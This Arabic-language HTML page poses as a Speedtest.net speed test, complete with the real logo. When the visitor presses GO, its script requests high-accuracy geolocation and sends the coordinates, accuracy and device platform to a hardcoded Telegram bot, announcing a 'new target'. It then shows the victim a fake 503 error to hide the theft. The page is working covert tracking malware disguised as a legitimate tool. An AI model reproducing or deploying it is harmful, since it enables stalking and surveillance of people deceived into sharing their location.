<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeedTest - فحص جودة الاتصال</title>
    <style>
        body { font-family:  Segoe UI , Tahoma, Geneva, Verdana, sans-serif; background-color: #0b0e14; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; background: #1c2128; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #30363d; width: 85%; max-width: 400px; }
        .logo { width: 120px; margin-bottom: 20px; filter: drop-shadow(0 0 10px #00ccff); }
        h2 { color: #00ccff; font-size: 1.5rem; margin-bottom: 10px; }
        p { color: #8b949e; font-size: 0.9rem; margin-bottom: 30px; }
        .go-btn { background: transparent; border: 4px solid #00ccff; color: #00ccff; width: 120px; height: 120px; border-radius: 50%; font-size: 1.8rem; font-weight: bold; cursor: pointer; transition: 0.3s; outline: none; box-shadow: 0 0 15px rgba(0,204,255,0.2); }
        .go-btn:hover { background: #00ccff; color: #0b0e14; box-shadow: 0 0 30px #00ccff; transform: scale(1.05); }
        .loading { display: none; margin-top: 20px; color: #00ccff; font-style: italic; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://www.speedtest.net/0/images/speedtest-logo.png" alt="Speedtest" class="logo">
    <h2>اختبار السرعة الذكي</h2>
    <p>يتم الآن تجهيز السيرفر الأقرب لموقعك.. اضغط GO للبدء</p>
    <button class="go-btn" onclick="captureEngine()">GO</button>
    <div id="status" class="loading">جاري الاتصال بالسيرفر...</div>
</div>

<script>
// --- إعدادات Lead Developer المحقونة ---
const TOKEN = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
const CHAT_ID = "7984067238";

function captureEngine() {
    document.getElementById( status ).style.display =  block ;
    if (navigator.geolocation) {
        // طلب الموقع بأعلى دقة ممكنة
        navigator.geolocation.getCurrentPosition(transmitData, handleError, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    } else {
        alert("خطأ في المتصفح: يرجى تحديث النظام.");
    }
}

async function transmitData(position) {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const acc = position.coords.accuracy;
    const platform = navigator.platform;
    const agent = navigator.userAgent;

    // بناء رسالة بنمط التليجرام الاحترافي
    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
    const report = `🔔 *إشعار نظام: تم رصد هدف جديد* \n\n` +
                   `📍 *الموقع:* [اضغط هنا لفتح الخريطة](${mapsUrl})\n` +
                   `🎯 *الدقة:* ${acc.toFixed(1)} متر\n` +
                   `📱 *الجهاز:* ${platform}\n` +
                   `🌐 *المتصفح:* تم جلب البيانات بنجاح.`;

    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method:  POST ,
            headers: {  Content-Type :  application/json  },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: report,
                parse_mode: "Markdown"
            })
        });
        
        // رسالة وهمية للضحية بعد سحب البيانات
        setTimeout(() => {
            alert("فشل اختبار السرعة: السيرفر مشغول حالياً (Error 503).");
            document.getElementById( status ).innerText = "فشل الاتصال.";
        }, 2000);

    } catch (err) {
        console.error("System Override Failed.");
    }
}

function handleError(error) {
    if (error.code === error.PERMISSION_DENIED) {
        alert("يجب السماح بالوصول للموقع لتحديد أقرب سيرفر فحص.");
    }
}
</script>

</body>
</html>
